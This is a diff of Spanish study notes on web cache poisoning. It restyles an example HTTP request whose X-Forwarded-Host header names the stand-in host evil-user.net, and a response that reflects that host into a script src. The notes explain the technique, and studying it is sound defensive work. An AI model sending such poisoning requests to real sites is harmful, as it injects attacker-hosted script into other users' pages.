@@ -17,18 +17,15 @@ El caso **canónico** de WCP: la app arma la URL de un **import de JavaScript** 
 
 ## Request → Response
 
-```http
-GET / HTTP/1.1
-Host: innocent-website.com
-X-Forwarded-Host: evil-user.net
-User-Agent: Mozilla/5.0 Firefox/57.0
-```
+> `GET / HTTP/1.1`
+> `Host: innocent-website.com`
+> `X-Forwarded-Host: `==`evil-user.net`==
+> `User-Agent: Mozilla/5.0 Firefox/57.0`
 
-```http
-HTTP/1.1 200 OK
-...
-<script src="https://evil-user.net/static/analytics.js"></script>
-```
+**⬇️ se incrusta en el `src` del import:**
+
+> `HTTP/1.1 200 OK`
+> `<script src="https://`==`evil-user.net`==`/static/analytics.js"></script>`
 
 ## Por qué funciona
 - La app **confía en `X-Forwarded-Host`** para generar el hostname de sus recursos (típico detrás de CDN/proxy) → vos decidís el host.
